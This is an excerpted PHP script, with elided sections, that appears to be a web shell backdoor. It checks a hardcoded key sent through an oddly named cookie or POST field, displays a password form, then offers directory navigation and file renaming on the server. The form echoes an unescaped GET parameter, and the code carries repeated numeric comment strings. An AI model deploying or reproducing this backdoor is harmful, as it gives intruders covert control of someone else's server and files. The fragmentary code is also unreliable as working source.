...
$auth_key = "b305094657b0104bdcf34ff2cde1cb14";
...
$pass = false;
if (isset($_COOKIE['pw_name_87154'])) {
    if(($_COOKIE['pw_name_87154']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_87154'])) {
        if(($_POST['pw_name_87154']) == $auth_key) {
            setcookie("pw_name_87154", $_POST['pw_name_87154']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_87154' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1737879110840858 1737879110948970 1737879110936466 1737879110435650
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1737879110840858 1737879110948970 1737879110936466 1737879110435650
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1737879110840858 1737879110948970 1737879110936466 1737879110435650
            $name = PATH . "/" . $_GET['r'];
